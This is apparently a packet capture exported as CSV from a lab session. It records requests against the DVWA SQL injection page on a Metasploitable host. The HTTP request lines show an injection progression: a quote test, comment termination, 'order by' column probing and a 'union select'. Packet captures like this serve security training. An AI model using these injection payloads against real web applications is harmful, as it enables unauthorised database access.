"No.","Time","Source","Destination","Protocol","Length","Info"
"1","0.000000000","10.0.2.5","34.149.100.209","TLSv1.2","100","Application Data"
"2","0.000220897","10.0.2.5","34.149.100.209","TLSv1.2","85","Encrypted Alert"
"3","0.000331259","34.149.100.209","10.0.2.5","TCP","60","443  >  34862 [ACK] Seq=1 Ack=79 Win=32172 Len=0"
"4","0.015726838","34.149.100.209","10.0.2.5","TCP","60","443  >  34862 [FIN, ACK] Seq=1 Ack=79 Win=32172 Len=0"
"5","0.015737053","10.0.2.5","34.149.100.209","TCP","54","34862  >  443 [ACK] Seq=79 Ack=2 Win=60532 Len=0"
"6","1.000711691","10.0.2.5","34.160.144.191","TLSv1.2","100","Application Data"
"7","1.001170227","10.0.2.5","34.160.144.191","TLSv1.2","85","Encrypted Alert"
"8","1.001745477","34.160.144.191","10.0.2.5","TCP","60","443  >  56406 [ACK] Seq=1 Ack=79 Win=31471 Len=0"
"9","1.015298503","34.160.144.191","10.0.2.5","TCP","60","443  >  56406 [FIN, ACK] Seq=1 Ack=79 Win=31471 Len=0"
"10","1.015309556","10.0.2.5","34.160.144.191","TCP","54","56406  >  443 [ACK] Seq=79 Ack=2 Win=30660 Len=0"
"11","8.617549052","10.0.2.4","10.0.2.5","TCP","66","80  >  41664 [FIN, ACK] Seq=1 Ack=1 Win=54 Len=0 TSval=26760 TSecr=3495261933"
"12","8.659116307","10.0.2.5","10.0.2.4","TCP","66","41664  >  80 [ACK] Seq=1 Ack=2 Win=249 Len=0 TSval=3495276971 TSecr=26760"
"13","22.517165153","10.0.2.5","10.0.2.4","TCP","74","51860  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495290829 TSecr=0 WS=128"
"14","22.517667991","10.0.2.4","10.0.2.5","TCP","74","80  >  51860 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=28149 TSecr=3495290829 WS=128"
"15","22.517707775","10.0.2.5","10.0.2.4","TCP","66","51860  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495290829 TSecr=28149"
"16","22.517832822","10.0.2.5","10.0.2.4","HTTP","566","GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit HTTP/1.1 "
"17","22.518094454","10.0.2.4","10.0.2.5","TCP","66","80  >  51860 [ACK] Seq=1 Ack=501 Win=6912 Len=0 TSval=28149 TSecr=3495290830"
"18","22.526312123","10.0.2.4","10.0.2.5","TCP","4410","80  >  51860 [ACK] Seq=1 Ack=501 Win=6912 Len=4344 TSval=28150 TSecr=3495290830 [TCP segment of a reassembled PDU]"
"19","22.526356318","10.0.2.5","10.0.2.4","TCP","66","51860  >  80 [ACK] Seq=501 Ack=4345 Win=31872 Len=0 TSval=3495290838 TSecr=28150"
"20","22.526774069","10.0.2.4","10.0.2.5","HTTP","459","HTTP/1.1 200 OK  (text/html)"
"21","22.526796094","10.0.2.5","10.0.2.4","TCP","66","51860  >  80 [ACK] Seq=501 Ack=4738 Win=31872 Len=0 TSval=3495290839 TSecr=28150"
"22","27.145675572","10.0.2.5","10.0.2.4","TCP","74","53106  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495295457 TSecr=0 WS=128"
"23","27.146322861","10.0.2.4","10.0.2.5","TCP","74","80  >  53106 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=28612 TSecr=3495295457 WS=128"
"24","27.146360113","10.0.2.5","10.0.2.4","TCP","66","53106  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495295458 TSecr=28612"
"25","27.146947721","10.0.2.5","10.0.2.4","HTTP","566","GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit HTTP/1.1 "
"26","27.147415406","10.0.2.4","10.0.2.5","TCP","66","80  >  53106 [ACK] Seq=1 Ack=501 Win=6912 Len=0 TSval=28612 TSecr=3495295459"
"27","27.154509721","10.0.2.4","10.0.2.5","TCP","2962","80  >  53106 [ACK] Seq=1 Ack=501 Win=6912 Len=2896 TSval=28613 TSecr=3495295459 [TCP segment of a reassembled PDU]"
"28","27.154542944","10.0.2.5","10.0.2.4","TCP","66","53106  >  80 [ACK] Seq=501 Ack=2897 Win=31872 Len=0 TSval=3495295466 TSecr=28613"
"29","27.154737007","10.0.2.4","10.0.2.5","TCP","1514","80  >  53106 [ACK] Seq=2897 Ack=501 Win=6912 Len=1448 TSval=28613 TSecr=3495295459 [TCP segment of a reassembled PDU]"
"30","27.154740283","10.0.2.5","10.0.2.4","TCP","66","53106  >  80 [ACK] Seq=501 Ack=4345 Win=31872 Len=0 TSval=3495295467 TSecr=28613"
"31","27.154881597","10.0.2.4","10.0.2.5","HTTP","459","HTTP/1.1 200 OK  (text/html)"
"32","27.154883246","10.0.2.5","10.0.2.4","TCP","66","53106  >  80 [ACK] Seq=501 Ack=4738 Win=31872 Len=0 TSval=3495295467 TSecr=28613"
"33","27.155234095","10.0.2.5","10.0.2.4","TCP","66","53106  >  80 [FIN, ACK] Seq=501 Ack=4738 Win=31872 Len=0 TSval=3495295467 TSecr=28613"
"34","27.155697649","10.0.2.4","10.0.2.5","TCP","66","80  >  53106 [FIN, ACK] Seq=4738 Ack=502 Win=6912 Len=0 TSval=28613 TSecr=3495295467"
"35","27.155703853","10.0.2.5","10.0.2.4","TCP","66","53106  >  80 [ACK] Seq=502 Ack=4739 Win=31872 Len=0 TSval=3495295468 TSecr=28613"
"36","32.611118003","10.0.2.5","34.117.121.53","TLSv1.2","100","Application Data"
"37","32.612008750","10.0.2.5","34.117.121.53","TLSv1.2","85","Encrypted Alert"
"38","32.612153739","10.0.2.5","34.117.121.53","TCP","54","51948  >  443 [FIN, ACK] Seq=78 Ack=1 Win=65535 Len=0"
"39","32.612448636","34.117.121.53","10.0.2.5","TCP","60","443  >  51948 [ACK] Seq=1 Ack=78 Win=32387 Len=0"
"40","32.612921879","34.117.121.53","10.0.2.5","TCP","60","443  >  51948 [ACK] Seq=1 Ack=79 Win=32386 Len=0"
"41","32.625967468","34.117.121.53","10.0.2.5","TCP","60","443  >  51948 [FIN, ACK] Seq=1 Ack=79 Win=32386 Len=0"
"42","32.625991687","10.0.2.5","34.117.121.53","TCP","54","51948  >  443 [ACK] Seq=79 Ack=2 Win=3740 Len=0"
"43","32.841645776","10.0.2.5","10.0.2.4","TCP","66","51860  >  80 [FIN, ACK] Seq=501 Ack=4738 Win=31872 Len=0 TSval=3495301153 TSecr=28150"
"44","32.841828078","10.0.2.5","10.0.2.4","TCP","66","41664  >  80 [FIN, ACK] Seq=1 Ack=2 Win=249 Len=0 TSval=3495301154 TSecr=26760"
"45","32.841937371","10.0.2.5","10.0.2.4","TCP","66","58554  >  80 [FIN, ACK] Seq=1 Ack=1 Win=249 Len=0 TSval=3495301154 TSecr=24105"
"46","32.842023222","10.0.2.4","10.0.2.5","TCP","66","80  >  41664 [ACK] Seq=2 Ack=2 Win=54 Len=0 TSval=29181 TSecr=3495301154"
"47","32.842079047","10.0.2.5","10.0.2.4","TCP","66","40804  >  80 [FIN, ACK] Seq=1 Ack=1 Win=249 Len=0 TSval=3495301154 TSecr=23436"
"48","32.842160954","10.0.2.4","10.0.2.5","TCP","66","80  >  58554 [ACK] Seq=1 Ack=2 Win=64 Len=0 TSval=29181 TSecr=3495301154"
"49","32.842331890","10.0.2.4","10.0.2.5","TCP","66","80  >  40804 [ACK] Seq=1 Ack=2 Win=62 Len=0 TSval=29181 TSecr=3495301154"
"50","32.842331925","10.0.2.4","10.0.2.5","TCP","66","80  >  51860 [FIN, ACK] Seq=4738 Ack=502 Win=6912 Len=0 TSval=29181 TSecr=3495301153"
"51","32.842339121","10.0.2.5","10.0.2.4","TCP","66","51860  >  80 [ACK] Seq=502 Ack=4739 Win=31872 Len=0 TSval=3495301154 TSecr=29181"
"52","33.772368641","10.0.2.5","10.0.2.4","TCP","74","53120  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495302084 TSecr=0 WS=128"
"53","33.772771342","10.0.2.4","10.0.2.5","TCP","74","80  >  53120 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=29274 TSecr=3495302084 WS=128"
"54","33.772803672","10.0.2.5","10.0.2.4","TCP","66","53120  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495302085 TSecr=29274"
"55","33.773597564","10.0.2.5","10.0.2.4","HTTP","567","GET /dvwa/vulnerabilities/sqli/?id=2'&Submit=Submit HTTP/1.1 "
"56","33.774200589","10.0.2.4","10.0.2.5","TCP","66","80  >  53120 [ACK] Seq=1 Ack=502 Win=6912 Len=0 TSval=29275 TSecr=3495302085"
"57","33.781344900","10.0.2.4","10.0.2.5","HTTP","597","HTTP/1.1 200 OK  (text/html)"
"58","33.781374267","10.0.2.5","10.0.2.4","TCP","66","53120  >  80 [ACK] Seq=502 Ack=532 Win=31872 Len=0 TSval=3495302093 TSecr=29275"
"59","34.784156660","10.0.2.5","10.0.2.4","TCP","66","53120  >  80 [FIN, ACK] Seq=502 Ack=532 Win=31872 Len=0 TSval=3495303096 TSecr=29275"
"60","34.784727130","10.0.2.4","10.0.2.5","TCP","66","80  >  53120 [FIN, ACK] Seq=532 Ack=503 Win=6912 Len=0 TSval=29376 TSecr=3495303096"
"61","34.784755409","10.0.2.5","10.0.2.4","TCP","66","53120  >  80 [ACK] Seq=503 Ack=533 Win=31872 Len=0 TSval=3495303097 TSecr=29376"
"62","37.683723174","PcsCompu_c9:93:64","RealtekU_12:35:00","ARP","42","Who has 10.0.2.1? Tell 10.0.2.5"
"63","37.683947876","RealtekU_12:35:00","PcsCompu_c9:93:64","ARP","60","10.0.2.1 is at 52:54:00:12:35:00"
"64","39.506573993","10.0.2.5","10.0.2.4","TCP","74","59422  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495307818 TSecr=0 WS=128"
"65","39.507220403","10.0.2.4","10.0.2.5","TCP","74","80  >  59422 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=29848 TSecr=3495307818 WS=128"
"66","39.507326034","10.0.2.5","10.0.2.4","TCP","66","59422  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495307819 TSecr=29848"
"67","39.507560249","10.0.2.5","10.0.2.4","HTTP","570","GET /dvwa/vulnerabilities/sqli/?id=2'--+&Submit=Submit HTTP/1.1 "
"68","39.507991336","10.0.2.4","10.0.2.5","TCP","66","80  >  59422 [ACK] Seq=1 Ack=505 Win=6912 Len=0 TSval=29848 TSecr=3495307819"
"69","39.515109910","10.0.2.4","10.0.2.5","TCP","2962","80  >  59422 [ACK] Seq=1 Ack=505 Win=6912 Len=2896 TSval=29849 TSecr=3495307819 [TCP segment of a reassembled PDU]"
"70","39.515135567","10.0.2.5","10.0.2.4","TCP","66","59422  >  80 [ACK] Seq=505 Ack=2897 Win=31872 Len=0 TSval=3495307827 TSecr=29849"
"71","39.515271835","10.0.2.4","10.0.2.5","TCP","1514","80  >  59422 [ACK] Seq=2897 Ack=505 Win=6912 Len=1448 TSval=29849 TSecr=3495307819 [TCP segment of a reassembled PDU]"
"72","39.515274500","10.0.2.5","10.0.2.4","TCP","66","59422  >  80 [ACK] Seq=505 Ack=4345 Win=31872 Len=0 TSval=3495307827 TSecr=29849"
"73","39.515530139","10.0.2.4","10.0.2.5","HTTP","463","HTTP/1.1 200 OK  (text/html)"
"74","39.515531983","10.0.2.5","10.0.2.4","TCP","66","59422  >  80 [ACK] Seq=505 Ack=4742 Win=31872 Len=0 TSval=3495307827 TSecr=29849"
"75","39.516338491","10.0.2.5","10.0.2.4","TCP","66","59422  >  80 [FIN, ACK] Seq=505 Ack=4742 Win=31872 Len=0 TSval=3495307828 TSecr=29849"
"76","39.516820231","10.0.2.4","10.0.2.5","TCP","66","80  >  59422 [FIN, ACK] Seq=4742 Ack=506 Win=6912 Len=0 TSval=29849 TSecr=3495307828"
"77","39.516829720","10.0.2.5","10.0.2.4","TCP","66","59422  >  80 [ACK] Seq=506 Ack=4743 Win=31872 Len=0 TSval=3495307829 TSecr=29849"
"78","47.697425676","10.0.2.4","10.0.2.255","BROWSER","286","Local Master Announcement METASPLOITABLE, Workstation, Server, Print Queue Server, Xenix Server, NT Workstation, NT Server, Master Browser"
"79","47.697707934","10.0.2.4","10.0.2.255","BROWSER","257","Domain/Workgroup Announcement WORKGROUP, NT Workstation, Domain Enum"
"80","48.954666375","10.0.2.5","10.0.2.4","TCP","74","60472  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495317266 TSecr=0 WS=128"
"81","48.955257521","10.0.2.4","10.0.2.5","TCP","74","80  >  60472 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=30792 TSecr=3495317266 WS=128"
"82","48.955286343","10.0.2.5","10.0.2.4","TCP","66","60472  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495317267 TSecr=30792"
"83","48.955445527","10.0.2.5","10.0.2.4","HTTP","581","GET /dvwa/vulnerabilities/sqli/?id=2'+order+by+1--+&Submit=Submit HTTP/1.1 "
"84","48.955823783","10.0.2.4","10.0.2.5","TCP","66","80  >  60472 [ACK] Seq=1 Ack=516 Win=6912 Len=0 TSval=30792 TSecr=3495317267"
"85","48.963282949","10.0.2.4","10.0.2.5","TCP","4410","80  >  60472 [ACK] Seq=1 Ack=516 Win=6912 Len=4344 TSval=30793 TSecr=3495317267 [TCP segment of a reassembled PDU]"
"86","48.963296957","10.0.2.5","10.0.2.4","TCP","66","60472  >  80 [ACK] Seq=516 Ack=4345 Win=31872 Len=0 TSval=3495317275 TSecr=30793"
"87","48.963577537","10.0.2.4","10.0.2.5","HTTP","474","HTTP/1.1 200 OK  (text/html)"
"88","48.963579919","10.0.2.5","10.0.2.4","TCP","66","60472  >  80 [ACK] Seq=516 Ack=4753 Win=31872 Len=0 TSval=3495317275 TSecr=30793"
"89","48.964249706","10.0.2.5","10.0.2.4","TCP","66","60472  >  80 [FIN, ACK] Seq=516 Ack=4753 Win=31872 Len=0 TSval=3495317276 TSecr=30793"
"90","48.964616108","10.0.2.4","10.0.2.5","TCP","66","80  >  60472 [FIN, ACK] Seq=4753 Ack=517 Win=6912 Len=0 TSval=30793 TSecr=3495317276"
"91","48.964623341","10.0.2.5","10.0.2.4","TCP","66","60472  >  80 [ACK] Seq=517 Ack=4754 Win=31872 Len=0 TSval=3495317276 TSecr=30793"
"92","53.264604766","10.0.2.5","10.0.2.4","TCP","74","60474  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495321576 TSecr=0 WS=128"
"93","53.265252563","10.0.2.4","10.0.2.5","TCP","74","80  >  60474 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=31223 TSecr=3495321576 WS=128"
"94","53.265271722","10.0.2.5","10.0.2.4","TCP","66","60474  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495321577 TSecr=31223"
"95","53.265895179","10.0.2.5","10.0.2.4","HTTP","581","GET /dvwa/vulnerabilities/sqli/?id=2'+order+by+2--+&Submit=Submit HTTP/1.1 "
"96","53.266362146","10.0.2.4","10.0.2.5","TCP","66","80  >  60474 [ACK] Seq=1 Ack=516 Win=6912 Len=0 TSval=31223 TSecr=3495321578"
"97","53.273860103","10.0.2.4","10.0.2.5","TCP","4410","80  >  60474 [ACK] Seq=1 Ack=516 Win=6912 Len=4344 TSval=31224 TSecr=3495321578 [TCP segment of a reassembled PDU]"
"98","53.273868782","10.0.2.5","10.0.2.4","TCP","66","60474  >  80 [ACK] Seq=516 Ack=4345 Win=31872 Len=0 TSval=3495321586 TSecr=31224"
"99","53.274403608","10.0.2.4","10.0.2.5","HTTP","474","HTTP/1.1 200 OK  (text/html)"
"100","53.274408621","10.0.2.5","10.0.2.4","TCP","66","60474  >  80 [ACK] Seq=516 Ack=4753 Win=31872 Len=0 TSval=3495321586 TSecr=31224"
"101","53.278263126","10.0.2.5","10.0.2.4","TCP","66","60474  >  80 [FIN, ACK] Seq=516 Ack=4753 Win=31872 Len=0 TSval=3495321590 TSecr=31224"
"102","53.278903424","10.0.2.4","10.0.2.5","TCP","66","80  >  60474 [FIN, ACK] Seq=4753 Ack=517 Win=6912 Len=0 TSval=31225 TSecr=3495321590"
"103","53.278911154","10.0.2.5","10.0.2.4","TCP","66","60474  >  80 [ACK] Seq=517 Ack=4754 Win=31872 Len=0 TSval=3495321591 TSecr=31225"
"104","56.655183530","10.0.2.5","10.0.2.4","TCP","74","56858  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495324967 TSecr=0 WS=128"
"105","56.655778179","10.0.2.4","10.0.2.5","TCP","74","80  >  56858 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=31562 TSecr=3495324967 WS=128"
"106","56.655815612","10.0.2.5","10.0.2.4","TCP","66","56858  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495324968 TSecr=31562"
"107","56.657484462","10.0.2.5","10.0.2.4","HTTP","581","GET /dvwa/vulnerabilities/sqli/?id=2'+order+by+3--+&Submit=Submit HTTP/1.1 "
"108","56.658066041","10.0.2.4","10.0.2.5","TCP","66","80  >  56858 [ACK] Seq=1 Ack=516 Win=6912 Len=0 TSval=31562 TSecr=3495324969"
"109","56.671469883","10.0.2.4","10.0.2.5","HTTP","482","HTTP/1.1 200 OK  (text/html)"
"110","56.671477377","10.0.2.5","10.0.2.4","TCP","66","56858  >  80 [ACK] Seq=516 Ack=417 Win=31872 Len=0 TSval=3495324983 TSecr=31563"
"111","57.673126597","10.0.2.5","10.0.2.4","TCP","66","56858  >  80 [FIN, ACK] Seq=516 Ack=417 Win=31872 Len=0 TSval=3495325985 TSecr=31563"
"112","57.674352758","10.0.2.4","10.0.2.5","TCP","66","80  >  56858 [FIN, ACK] Seq=417 Ack=517 Win=6912 Len=0 TSval=31664 TSecr=3495325985"
"113","57.674373655","10.0.2.5","10.0.2.4","TCP","66","56858  >  80 [ACK] Seq=517 Ack=418 Win=31872 Len=0 TSval=3495325986 TSecr=31664"
"114","61.983234635","10.0.2.5","10.0.2.3","DHCP","324","DHCP Request  - Transaction ID 0xf91ce60f"
"115","61.991564584","10.0.2.3","10.0.2.5","DHCP","590","DHCP ACK      - Transaction ID 0xf91ce60f"
"116","67.122775447","PcsCompu_c9:93:64","PcsCompu_cc:77:b6","ARP","42","Who has 10.0.2.3? Tell 10.0.2.5"
"117","67.122967619","PcsCompu_cc:77:b6","PcsCompu_c9:93:64","ARP","60","10.0.2.3 is at 08:00:27:cc:77:b6"
"118","69.031296878","10.0.2.5","10.0.2.4","TCP","74","52290  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495337343 TSecr=0 WS=128"
"119","69.031890864","10.0.2.4","10.0.2.5","TCP","74","80  >  52290 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=32799 TSecr=3495337343 WS=128"
"120","69.031902975","10.0.2.5","10.0.2.4","TCP","66","52290  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495337344 TSecr=32799"
"121","69.032476842","10.0.2.5","10.0.2.4","HTTP","587","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+1,2--+&Submit=Submit HTTP/1.1 "
"122","69.033034024","10.0.2.4","10.0.2.5","TCP","66","80  >  52290 [ACK] Seq=1 Ack=522 Win=6912 Len=0 TSval=32800 TSecr=3495337344"
"123","69.040710495","10.0.2.4","10.0.2.5","TCP","2962","80  >  52290 [ACK] Seq=1 Ack=522 Win=6912 Len=2896 TSval=32800 TSecr=3495337344 [TCP segment of a reassembled PDU]"
"124","69.040728576","10.0.2.5","10.0.2.4","TCP","66","52290  >  80 [ACK] Seq=522 Ack=2897 Win=31872 Len=0 TSval=3495337353 TSecr=32800"
"125","69.040880574","10.0.2.4","10.0.2.5","TCP","1514","80  >  52290 [ACK] Seq=2897 Ack=522 Win=6912 Len=1448 TSval=32800 TSecr=3495337344 [TCP segment of a reassembled PDU]"
